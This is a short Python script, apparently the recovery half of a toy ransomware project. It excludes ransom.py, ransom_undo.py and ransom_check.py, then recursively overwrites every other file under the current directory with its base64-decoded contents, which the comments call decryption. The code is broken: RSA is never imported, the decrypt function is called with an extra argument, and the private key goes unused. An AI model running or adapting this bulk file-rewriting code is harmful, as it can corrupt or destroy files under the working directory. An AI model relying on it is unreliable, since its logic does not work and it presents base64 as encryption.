import os, base64
root_dir = os.getcwd()

### base64 decodes file contents ###
def decrypt(dir, filen):
	if filen != "ransom.py" and filen != "ransom_undo.py" and filen != "ransom_check.py":
		file = open(dir + "/" + filen)
		contents = file.read()
		file.close()
		file = open( dir + "/" + filen, "w")
		file.write( base64.b64decode(contents) )
		file.close()
		print("File decrypted: " + dir + "/" + filen)

private_key = RSA.importKey(open("priv.pem","r"))

### decrypting files ###
for subdir, dirs, files in os.walk(root_dir):
	for file in files:
		decrypt(subdir, file, private_key)
